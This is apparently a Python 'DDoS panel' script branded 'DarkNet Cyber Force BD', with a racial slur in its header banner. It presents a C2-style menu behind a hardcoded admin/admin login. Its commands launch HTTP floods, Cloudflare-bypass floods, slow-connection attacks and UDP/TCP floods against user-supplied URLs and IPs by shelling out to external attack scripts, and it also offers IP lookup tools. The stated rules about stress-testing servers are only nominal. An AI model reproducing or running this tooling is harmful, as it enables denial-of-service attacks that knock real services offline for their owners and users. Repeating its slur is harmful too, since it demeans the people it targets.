######################################
# DarkNet Cyber Force BD Made by DCFBD #
# COPY = NIGGER                      #
######################################

import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

try:
    proxys = open('proxies.txt').readlines()
    bots = len(proxys)
except:
    bots = 0

def si():
    print('\x1b[38;2;0;255;255m[ DCFBD ] | Welcome to DarkNet Cyber Force BD! | Owner: DCFBD | Update v1.1\x1b[0m\n')

def tools():
    clear()
    si()
    print('''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mTools     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mgeoip               \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverse-dns           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverseip           \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255msubnet-lookup       \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255masn-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mdns-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝\x1b[0m
''')
    
def banners():
    clear()
    si()
    print('''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mBanners   \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mtroll               \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mpikachu             \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝\x1b[0m
''')

def rules():
    clear()
    si()
    print('''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mRules     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m2. Do not attack .gov/.gob/.edu/.mil domains  \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m4. Only attack stress testing servers         \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m5. Don't skid the panel                       \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;255;255m6. Give a star to the github repository       \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝\x1b[0m
''')

def ports():
    clear()
    si()
    print('''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mPorts     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩═══════════════╩═══════════════╗
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m21 - \x1b[38;2;0;255;255mSFTP       \x1b[38;2;0;212;14m80   - \x1b[38;2;0;255;255mHTTP              \x1b[38;2;0;212;14m║   
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m22 - \x1b[38;2;0;255;255mSSH        \x1b[38;2;0;212;14m443  - \x1b[38;2;0;255;255mHTTPS             \x1b[38;2;0;212;14m║   
                \x1b[38;2;0;212;14m║ \x1b[38;2;0;212;14m53 - \x1b[38;2;0;255;255mDNS        \x1b[38;2;0;212;14m25565- \x1b[38;2;0;255;255mMINECRAFT         \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚═══════════════════════════════════════════════╝\x1b[0m
''')

def special():
    clear()
    si()
    print('''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mSpecial    \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mstress              \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝\x1b[0m
''')
    
def layer7():
    clear()
    si()
    print('''
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLayer 7    \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-raw            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcrash             \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-socket         \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttpflood         \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcf-bypass           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mslow              \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝\x1b[0m
''')

def layer4():
    clear()
    si()
    print('''
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLayer 4    \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mudp                 \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mtcp               \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mstd                 \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mdestroy           \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝\x1b[0m
''')

def amp_games():
    clear()
    si()
    print('''
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║\x1b[38;2;0;255;255m AMP's \x1b[38;2;0;212;14m/ \x1b[38;2;0;255;255mGames \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mminecraft           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255msamp              \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝\x1b[0m
''')

def menu():
    sys.stdout.write(f"\x1b]2;DarkNet Cyber Force BD C2 --> Stars: [{bots}] | Online Users: [1]\x07")
    clear()
    print('\x1b[38;2;0;255;255m[ DCFBD ] | Welcome to DarkNet Cyber Force BD! | Owner: DCFBD | Update v1.1\x1b[0m\n')
    print("""
                    \x1b[38;2;0;255;255m██████╗  ██████╗███████╗██████╗ ██████╗ 
                    \x1b[38;2;0;212;14m██╔══██╗██╔════╝██╔════╝██╔══██╗██╔══██╗
                    \x1b[38;2;0;186;45m██║  ██║██║     █████╗  ██████╔╝██║  ██║
                    \x1b[38;2;0;150;88m██║  ██║██║     ██╔══╝  ██╔══██╗██║  ██║
                    \x1b[38;2;0;113;133m██████╔╝╚██████╗██║     ██████╔╝██████╔╝\x1b[0m

                \x1b[38;2;0;212;14m╔═══════════════════════════════════════════╗
                \x1b[38;2;0;212;14m║      DarkNet Cyber Force BD Panel         ║
                \x1b[38;2;0;212;14m║      DCFBD DDoS Panel 2026                ║
                \x1b[38;2;0;212;14m╚═══════════════════════════════════════════╝
                    \x1b[38;2;0;212;14m╔═════════════════════════════════════╗
                    \x1b[38;2;0;212;14m║ github.com/darknetcyberforcebddcfbd ║
                    \x1b[38;2;0;212;14m╚═════════════════════════════════════╝
                \x1b[38;2;0;212;14m╔═══════════════════════════════════════════╗
                \x1b[38;2;0;212;14m║   Type help to see all the commands.      ║
                \x1b[38;2;0;212;14m╚═══════════════════════════════════════════╝\x1b[0m
""")

def main():
    menu()
    while(True):
        cnc = input('\x1b[38;2;0;212;14m╔══[C2@DCFBD]\n╚═══➤ \x1b[0m')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            layer4()
        elif cnc == "amp" or cnc == "AMP" or cnc == "amps/games":
            amp_games()
        elif cnc == "special" or cnc == "SPECIAL":
            special()
        elif cnc == "rules" or cnc == "RULES":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "cls":
            main()
        elif cnc == "ports" or cnc == "PORTS":
            ports()
        elif cnc == "tools" or cnc == "TOOLS":
            tools()
        elif cnc == "banner" or cnc == "BANNERS":
            banners()
        elif cnc == "help":
            print('''
LAYER7  ► SHOW LAYER7 METHODS
LAYER4  ► SHOW LAYER4 METHODS
AMP     ► SHOW AMP METHODS
SPECIAL ► SHOW SPECIAL METHODS
BANNERS ► SHOW BANNERS
RULES   ► RULES PANEL
PORTS   ► SHOW ALL PORTS
TOOLS   ► SHOW TOOLS
CLEAR   ► CLEAR TERMINAL
            ''')

# LAYER 7 METHODS & ATTACK COMMANDS
        elif "crash" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run Hulk.go -site {url} -data {method}')
            except IndexError:
                print('Usage: crash <url> METHODS<GET/POST>')
                print('Example: crash http://example.com GET')

        elif "httpflood" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time_val = cnc.split()[4]
                os.system(f'go run httpflood.go {url} {thread} {method} {time_val} nil')
            except IndexError:
                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
                print('Example: httpflood http://example.com 15000 get 60')

        elif "slow" in cnc:
            try:
                url = cnc.split()[1]
                time_val = cnc.split()[2]
                os.system(f'node slow.js {url} {time_val}')
            except IndexError:
                print('Usage: slow <url> <time>')
                print('Example: slow http://vailon.com 60')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time_val = cnc.split()[2]
                os.system(f'node HTTP-RAW {url} {time_val}')
            except IndexError:
                print('Usage: http-raw <url> <time>')
                print('Example: http-raw http://example.com 60')

        elif "http-socket" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time_val = cnc.split()[3]
                os.system(f'node HTTP-SOCKET {url} {per} {time_val}')
            except IndexError:
                print('Usage: http-socket <url> <per> <time>')
                print('Example: http-socket http://example.com 5000 60')

        elif "cf-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time_val = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'node cf.js {url} {time_val} {thread}')
            except IndexError:
                print('Usage: cf-bypass <url> <time> <threads>')
                print('Example: cf-bypass http://example.com 60 1250')

# LAYER 4 METHODS
        elif "udp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python2 udp.py {ip} {port} 0 0')
            except IndexError:
                print('Usage: udp <ip> <port>')
                print('Example: udp 1.1.1.1 80')

        elif "tcp" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time_val = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./100UP-TCP {method} {ip} {port} {time_val} {conns}')
            except IndexError:
                print('Usage: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('Example: tcp GET 1.1.1.1 80 60 8500')

        elif "std" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./STD-NOSPOOF {ip} {port}')
            except IndexError:
                print('Usage: std <ip> <port>')
                print('Example: std 1.1.1.1 80')

        elif "destroy" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time_val = cnc.split()[3]
                os.system(f'perl destroy.pl {ip} {port} 65500 {time_val}')
            except IndexError:
                print('Usage: destroy <ip> <port> <time>')
                print('Example: destroy 1.1.1.1 80 60')

# BANNERS & TOOLS
        elif "troll" in cnc:
            print('░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░   ')
            print('░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░  ')
            print('░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░  ')

        elif "pikachu" in cnc:
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')

        elif "geoip" in cnc:
            try:
                ip = cnc.split()[1]
                r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                print(r.text)
            except:
                print('Usage: geoip <ip>')

        else:
            try:
                cmmnd = cnc.split()[0]
                print(f"Command: [ {cmmnd} ] Not Found!")
            except IndexError:
                pass

def login():
    clear()
    user = "admin"
    passwd = "admin"
    username = input("⚡ Username: ")
    password = getpass.getpass(prompt='⚡ Password: ')
    if username != user or password != passwd:
        print("\n⚡ Haizzz, you're so cute...")
        sys.exit(1)
    elif username == user and password == passwd:
        print("⚡ Welcome to DarkNet Cyber Force BD!")
        time.sleep(0.3)
        main()

login()
